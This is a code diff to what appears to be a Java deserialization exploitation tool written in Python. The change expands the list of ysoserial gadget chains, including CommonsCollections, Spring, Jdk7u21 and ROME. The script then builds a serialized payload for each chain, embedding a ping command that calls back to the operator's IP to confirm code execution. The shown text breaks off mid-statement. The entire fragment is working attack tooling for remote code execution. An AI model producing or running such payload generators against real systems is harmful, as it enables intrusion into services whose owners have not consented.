@@ -38,10 +38,14 @@ def pre_main():
 
     hostname = socket.gethostname()
     ip_add = socket.gethostbyname(hostname)
-    ping_list = ["BeanShell1", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
-                 "Hibernate1",
-                 "Hibernate2",
-                 "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
+    # ping_list = ["BeanShell1", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
+    #              "Hibernate1",
+    #              "Hibernate2",
+    #              "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
+    ping_list = ["CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
+                 "CommonsCollections4", "Jdk7u21", "ROME", "Spring1", "Spring2", "BeanShell1",
+                 "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
+                 "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
 
     for name in ping_list:
         command = "java -jar {}/ysoserial-master-55f1e7c35c-1.jar {} 'ping {} -n 1' > core/payload_ping/{}.bin".format(
